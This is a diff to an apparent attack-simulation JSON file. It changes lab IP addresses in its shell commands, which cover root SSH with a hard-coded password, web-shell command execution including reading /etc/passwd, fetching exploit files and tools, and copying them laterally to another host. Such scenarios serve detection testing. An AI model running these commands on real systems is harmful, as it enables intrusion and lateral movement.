@@ -10,7 +10,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'curl -s --header 'Host: oldsub.legitshipping.co.il' http://172.22.0.20/; nc -vz 172.21.0.20 53; dig @172.21.0.20 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://172.22.0.20/'"
+        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'curl -s --header 'Host: oldsub.legitshipping.co.il' http://192.168.30.40/; nc -vz 192.168.20.30 53; dig @192.168.20.30 oldsub.legitshipping.co.il; curl -s --header 'Host: oldsub.legitshipping.co.il' http://192.168.30.40/'"
       }
     ]
   },
@@ -25,7 +25,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -F \"file=@/bin/bash\" http://172.21.0.20:8010/upload"
+        "command": "curl -F \"file=@/bin/bash\" http://192.168.20.30:8010/upload"
       }
     ]
   },
@@ -40,7 +40,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl http://172.21.0.20/ > /dev/null && curl http://172.21.0.20:5000/exploit.js > /tmp/exploit.js && curl --data \"username=victim&password=Passw0rd\" http://172.21.0.20/foca.php"
+        "command": "curl http://192.168.20.30/ > /dev/null && curl http://192.168.20.30:5000/exploit.js > /tmp/exploit.js && curl --data \"username=victim&password=Passw0rd\" http://192.168.20.30/foca.php"
       }
     ]
   },
@@ -55,7 +55,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl \"http://172.21.0.20/oili.php?cmd=ip%20addr\""
+        "command": "curl \"http://192.168.20.30/oili.php?cmd=ip%20addr\""
       }
     ]
   },
@@ -70,7 +70,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -F 'cmd=uname -a' http://172.21.0.20:5015/exec; curl -X POST -F 'cmd=whoami' http://172.21.0.20:5015/exec; curl -X POST -F 'cmd=ps aux' http://172.21.0.20:5015/exec; curl -X POST -F 'cmd=cat /etc/passwd' http://172.21.0.20:5015/exec"
+        "command": "curl -X POST -F 'cmd=uname -a' http://192.168.20.30:5015/exec; curl -X POST -F 'cmd=whoami' http://192.168.20.30:5015/exec; curl -X POST -F 'cmd=ps aux' http://192.168.20.30:5015/exec; curl -X POST -F 'cmd=cat /etc/passwd' http://192.168.20.30:5015/exec"
       }
     ]
   },
@@ -85,7 +85,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "dig @172.21.0.20 www.malicious-example.com A +short"
+        "command": "dig @192.168.20.30 www.malicious-example.com A +short"
       }
     ]
   },
@@ -100,7 +100,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "sshpass -p RootPass123 scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@172.21.0.20:/tmp/wget;sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'chmod +x /tmp/wget && /tmp/wget -O /tmp/tool.sh http://172.21.0.20/tool.sh && /tmp/wget -O /tmp/tool.bin http://172.21.0.20/tool.bin';sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p RootPass123 scp -o StrictHostKeyChecking=no /tmp/tool.sh root@172.22.0.20:/tmp/tool.sh';sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p RootPass123 scp -o StrictHostKeyChecking=no /tmp/tool.bin root@172.22.0.20:/tmp/tool.bin'"
+        "command": "sshpass -p RootPass123 scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /usr/bin/wget root@192.168.20.30:/tmp/wget;sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'chmod +x /tmp/wget && /tmp/wget -O /tmp/tool.sh http://192.168.20.30/tool.sh && /tmp/wget -O /tmp/tool.bin http://192.168.20.30/tool.bin';sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p RootPass123 scp -o StrictHostKeyChecking=no /tmp/tool.sh root@192.168.30.40:/tmp/tool.sh';sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@192.168.20.30 'sshpass -p RootPass123 scp -o StrictHostKeyChecking=no /tmp/tool.bin root@192.168.30.40:/tmp/tool.bin'"
       }
     ]
   },
@@ -115,7 +115,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl http://172.21.0.20/tools/tool.txt -o /tmp/tool.txt"
+        "command": "curl http://192.168.20.30/tools/tool.txt -o /tmp/tool.txt"
       }
     ]
   },
@@ -130,7 +130,7 @@
       {
         "name": "sh",
         "platform": "linux",
-        "command": "curl -X POST -F 'cmd=uname -a' http://172.21.0.20:5000/exec; curl -X POST -F 'cmd=whoami' http://172.21.0.20:5000/exec; curl -X POST -F 'cmd=ps aux' http://172.21.0.20:5000/exec; curl -X POST -F 'cmd=cat /etc/passwd' http://172.21.0.20:5000/exec"
+        "command": "curl -X POST -F 'cmd=uname -a' http://192.168.20.30:5000/exec; curl -X POST -F 'cmd=whoami' http://192.168.20.30:5000/exec; curl -X POST -F 'cmd=ps aux' http://192.168.20.30:5000/exec; curl -X POST -F 'cmd=cat /etc/passwd' http://192.168.20.30:5000/exec"
       }
     ]
   },
